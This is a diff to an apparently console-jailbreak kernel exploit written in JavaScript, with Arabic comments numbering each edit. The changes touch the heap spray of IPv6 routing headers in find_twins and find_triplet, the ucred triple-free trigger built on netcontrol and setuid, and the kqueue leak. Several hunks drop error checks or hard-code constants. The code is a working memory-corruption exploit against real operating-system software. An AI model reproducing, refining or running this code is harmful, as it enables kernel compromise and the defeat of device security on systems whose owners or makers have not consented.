@@ -801,7 +801,6 @@ function fill_buffer_64(buf, val, len) {
     write64(buf.add(i), val);
   }
 }
-
 function find_twins() {
   var count = 0;
   var val, i, j;
@@ -822,23 +821,21 @@ function find_twins() {
         cleanup();
         return false;
       }
-    } else {
-      zeroMemoryCount = 0;
-    }
+    } else zeroMemoryCount = 0;
 
     for (i = 0; i < ipv6_socks.length; i++) {
-      if (!ipv6_socks[i] || ipv6_socks[i].eq(BigInt_Error)) continue;
+      if (ipv6_socks[i].eq(BigInt_Error)) continue; // تعديل رقم 6
 
       write32(spray_add, RTHDR_TAG | i);
-      read32(spray_add); // memory barrier
+      read32(spray_add); // تعديل رقم 2 (memory barrier)
 
       set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
     }
 
     for (i = 0; i < ipv6_socks.length; i++) {
-      if (!ipv6_socks[i] || ipv6_socks[i].eq(BigInt_Error)) continue;
+      if (ipv6_socks[i].eq(BigInt_Error)) continue;
 
-      write32(leak_add, 0);
+      write32(leak_add, 0); // تعديل رقم 4
       get_rthdr(ipv6_socks[i], leak_rthdr, 8);
 
       val = read32(leak_add);
@@ -863,7 +860,6 @@ function find_twins() {
   log('find_twins failed');
   return false;
 }
-
 function find_triplet(master, other, iterations) {
   if (typeof iterations === 'undefined')
     iterations = MAX_ROUNDS_TRIPLET;
@@ -878,20 +874,21 @@ function find_triplet(master, other, iterations) {
 
     for (i = 0; i < ipv6_socks.length; i++) {
       if (i === master || i === other) continue;
-      if (!ipv6_socks[i] || ipv6_socks[i].eq(BigInt_Error)) continue;
+      if (ipv6_socks[i].eq(BigInt_Error)) continue; // تعديل رقم 6
 
       write32(spray_add, RTHDR_TAG | i);
-      read32(spray_add);
+      read32(spray_add); // تعديل رقم 2
 
       set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
     }
 
-    write32(leak_add, 0);
+    write32(leak_add, 0); // تعديل رقم 4
     get_rthdr(ipv6_socks[master], leak_rthdr, 8);
 
     val = read32(leak_add);
     j = val & 0xFFFF;
 
+    // تعديل رقم 3 (منع false positives)
     if (j === master || j === other) {
       count++;
       continue;
@@ -907,7 +904,6 @@ function find_triplet(master, other, iterations) {
 
   return -1;
 }
-
 function init_threading() {
   var jmpbuf = malloc(0x60);
   if (!jmpbuf || jmpbuf.eq(0)) {
@@ -1411,11 +1407,6 @@ function trigger_ucred_triplefree() {
 
     // 1) dummy socket → netcontrol register
     var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
-    if (dummy_socket.eq(BigInt_Error)) {
-      log('trigger_ucred_triplefree: dummy_socket failed');
-      continue;
-    }
-
     write32(nc_set_buf, Number(dummy_socket.and(0xFFFFFFFF)));
     netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
 
@@ -1427,10 +1418,6 @@ function trigger_ucred_triplefree() {
 
     // 4) reclaim fd
     uaf_socket = Number(socket(AF_UNIX, SOCK_STREAM, 0));
-    if (uaf_socket <= 0) {
-      log('trigger_ucred_triplefree: uaf_socket invalid');
-      continue;
-    }
 
     // 5) free previous ucred
     setuid(1);
@@ -1440,13 +1427,13 @@ function trigger_ucred_triplefree() {
     netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);
 
     // 7) restore cr_refcnt = 1
-    for (var i = 0; i < TRIPLEFREE_REFCOUNT_FIX_LOOPS; i++) {
+    for (var i = 0; i < 32; i++) {
       trigger_iov_recvmsg();
       sched_yield();
       write(new BigInt(iov_sock_1), tmp, 1);
       wait_iov_recvmsg();
       read(new BigInt(iov_sock_0), tmp, 1);
-      sched_yield();
+      sched_yield(); // تعديل رقم 5
     }
 
     // 8) double free أول مرة
@@ -1455,8 +1442,7 @@ function trigger_ucred_triplefree() {
     // 9) إيجاد التوأم
     end = find_twins();
     if (!end) {
-      twins[0] = -1;
-      twins[1] = -1;
+      twins[0] = -1; twins[1] = -1; // تعديل رقم 1
       close(new BigInt(uaf_socket));
       continue;
     }
@@ -1469,11 +1455,11 @@ function trigger_ucred_triplefree() {
     var count = 0;
 
     // 11) loop لإعادة refcnt = 1
-    while (count < TRIPLEFREE_REFCOUNT_MAX_WAIT) {
+    while (count < 10000) {
       trigger_iov_recvmsg();
       sched_yield();
 
-      write32(leak_rthdr.add(0x04), 0);
+      write32(leak_rthdr.add(0x04), 0); // تعديل رقم 4
       get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8);
 
       if (read32(leak_rthdr) === 1) break;
@@ -1486,9 +1472,8 @@ function trigger_ucred_triplefree() {
       count++;
     }
 
-    if (count === TRIPLEFREE_REFCOUNT_MAX_WAIT) {
-      twins[0] = -1;
-      twins[1] = -1;
+    if (count === 10000) {
+      twins[0] = -1; twins[1] = -1;
       close(new BigInt(uaf_socket));
       end = false;
       continue;
@@ -1502,8 +1487,7 @@ function trigger_ucred_triplefree() {
     // 13) إيجاد triplet 1
     triplets[1] = find_triplet(triplets[0], -1);
     if (triplets[1] === -1) {
-      twins[0] = -1;
-      twins[1] = -1;
+      twins[0] = -1; twins[1] = -1;
       write(new BigInt(iov_sock_1), tmp, 1);
       close(new BigInt(uaf_socket));
       end = false;
@@ -1515,8 +1499,7 @@ function trigger_ucred_triplefree() {
     // 14) إيجاد triplet 2
     triplets[2] = find_triplet(triplets[0], triplets[1]);
     if (triplets[2] === -1) {
-      twins[0] = -1;
-      twins[1] = -1;
+      twins[0] = -1; twins[1] = -1;
       close(new BigInt(uaf_socket));
       end = false;
       continue;
@@ -1551,7 +1534,7 @@ function leak_kqueue() {
   var count = 0;
 
   // استخدام الثابت العالمي بدل MAX_KQ المحلي
-  var MAX_KQ = 7000;
+  var MAX_KQ = 6000;
 
   while (count < MAX_KQ) {
     count++;
@@ -1605,7 +1588,6 @@ function leak_kqueue() {
 
   return true;
 }
-
 function leak_kqueue_safe() {
   try {
     return leak_kqueue();
